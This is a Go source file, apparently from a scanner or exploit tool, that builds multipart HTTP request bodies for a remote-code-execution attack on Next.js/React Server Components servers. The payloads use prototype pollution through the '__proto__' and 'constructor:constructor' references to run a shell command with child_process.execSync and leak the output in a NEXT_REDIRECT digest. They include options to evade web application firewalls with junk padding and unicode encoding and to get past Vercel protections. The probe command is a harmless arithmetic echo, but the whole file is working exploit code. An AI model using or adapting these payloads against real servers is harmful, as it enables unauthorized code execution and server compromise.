package payload

import (
	"encoding/json"
	"fmt"
	"strings"
)

type RCEBuilder struct {
	windows          bool
	wafBypass        bool
	wafBypassSizeKB  int
	unicodeEncode    bool
	vercelBypass     bool
}

func NewRCEBuilder() *RCEBuilder {
	return &RCEBuilder{
		wafBypassSizeKB: 128,
	}
}

func (b *RCEBuilder) SetWindows(windows bool) *RCEBuilder {
	b.windows = windows
	return b
}

func (b *RCEBuilder) SetWAFBypass(bypass bool, sizeKB int) *RCEBuilder {
	b.wafBypass = bypass
	if sizeKB > 0 {
		b.wafBypassSizeKB = sizeKB
	}
	return b
}

func (b *RCEBuilder) SetUnicodeEncode(encode bool) *RCEBuilder {
	b.unicodeEncode = encode
	return b
}

func (b *RCEBuilder) SetVercelBypass(bypass bool) *RCEBuilder {
	b.vercelBypass = bypass
	return b
}

func (b *RCEBuilder) Build() Payload {
	if b.vercelBypass {
		return b.buildVercelBypass()
	}

	var cmd string
	if b.windows {
		cmd = "powershell -c \\\"41*271\\\""
	} else {
		cmd = "echo $((41*271))"
	}

	prefixPayload := fmt.Sprintf(
		"var res=process.mainModule.require('child_process').execSync('%s')"+
			".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"+
			"{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
		cmd,
	)

	part0Data := map[string]interface{}{
		"then":   "$1:__proto__:then",
		"status": "resolved_model",
		"reason": -1,
		"value":  "{\"then\":\"$B1337\"}",
		"_response": map[string]interface{}{
			"_prefix":   prefixPayload,
			"_chunks":   "$Q2",
			"_formData": map[string]string{"get": "$1:constructor:constructor"},
		},
	}

	part0JSON, _ := json.Marshal(part0Data)
	part0 := string(part0JSON)

	if b.unicodeEncode {
		part0 = encodeUnicode(part0)
	}

	var parts []string

	if b.wafBypass {
		paramName, junk := generateJunkData(b.wafBypassSizeKB)
		parts = append(parts, fmt.Sprintf(
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
				"Content-Disposition: form-data; name=\"%s\"\r\n\r\n"+
				"%s\r\n",
			paramName, junk,
		))
	}

	parts = append(parts,
		fmt.Sprintf("------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"0\"\r\n\r\n"+
			"%s\r\n", part0),
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"1\"\r\n\r\n"+
			"\"$@0\"\r\n",
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"2\"\r\n\r\n"+
			"[]\r\n",
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
	)

	return Payload{
		Body:        strings.Join(parts, ""),
		ContentType: "multipart/form-data; boundary=" + boundary,
	}
}

func (b *RCEBuilder) buildVercelBypass() Payload {
	part0 := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,` +
		`"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":` +
		`"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;` +
		`throw Object.assign(new Error('NEXT_REDIRECT'),{digest: ` +
		"`NEXT_REDIRECT;push;/login?a=${res};307;`});\"," +
		`"_chunks":"$Q2","_formData":{"get":"$3:\"$$:constructor:constructor"}}}`

	body := "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" +
		"Content-Disposition: form-data; name=\"0\"\r\n\r\n" +
		part0 + "\r\n" +
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" +
		"Content-Disposition: form-data; name=\"1\"\r\n\r\n" +
		"\"$@0\"\r\n" +
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" +
		"Content-Disposition: form-data; name=\"2\"\r\n\r\n" +
		"[]\r\n" +
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" +
		"Content-Disposition: form-data; name=\"3\"\r\n\r\n" +
		"{\"\\u0024\\u0024\":{}}\r\n" +
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"

	return Payload{
		Body:        body,
		ContentType: "multipart/form-data; boundary=" + boundary,
	}
}

